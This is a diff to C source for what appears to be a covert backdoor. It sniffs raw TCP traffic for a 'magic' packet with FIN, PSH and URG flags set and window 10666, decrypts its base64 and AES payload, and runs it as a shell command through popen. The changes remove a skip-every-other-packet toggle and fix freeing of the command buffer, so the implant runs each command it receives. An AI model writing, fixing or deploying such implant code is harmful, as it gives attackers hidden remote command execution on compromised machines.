@@ -64,7 +64,7 @@ void handleErrors()
 int main(void)
 {
 	FILE *fpipe;
- 	int  sockfd=0,counter=0,cmd=1;
+ 	int  sockfd=0,counter=0;
  	char buffer[MAX],line[MAX];
  	char ip_tmp[INET_ADDRSTRLEN];
  	struct iphdr *iphr;
@@ -82,11 +82,7 @@ int main(void)
  	{
   		if((ntohs(tcphr->dest)==PORT)&&(tcphr->fin == 1)&&(tcphr->psh == 1) && (tcphr->urg == 1) && (tcphr->window == htons(10666))) 
   		{
-   			if(!(cmd&1))
-   			{
-    				cmd=1; 
-    
-   			} else {
+
     
             unsigned char plaintext[1024],ciphertext[1024+EVP_MAX_BLOCK_LENGTH],tag[100],pt[1024+EVP_MAX_BLOCK_LENGTH];
 
@@ -98,12 +94,12 @@ int main(void)
             k = decrypt(decode_64_input, strlen(decode_64_input), aad, sizeof(aad), tag, key, iv, pt);
             char *decode_64_output=decode64(pt,strlen(pt));
             int sizedecode=strlen(decode_64_output);
-    				char *cmd=malloc(sizedecode+1*sizeof(char));
-            memset(cmd,0,sizedecode);
-    				snprintf(cmd,sizedecode+1*sizeof(char),"%s",decode_64_output);
+    				char *cmd2=malloc(sizedecode+1*sizeof(char));
+            memset(cmd2,0,sizedecode);
+    				snprintf(cmd2,sizedecode+1*sizeof(char),"%s",decode_64_output);
 
 
-    				if ( !(fpipe = (FILE *)popen (cmd,"r")) ) 
+    				if ( !(fpipe = (FILE *)popen (cmd2,"r")) ) 
     				{
      					puts("error on pipe");
      					exit(1);
@@ -125,11 +121,8 @@ int main(void)
     				pclose(fpipe);
     	       
     				free(decode_64_input);
-   // 				free(cmd);
-            
-
-    				cmd++;
-   			}
+    				free(cmd2);
+    				
 
   		}
 
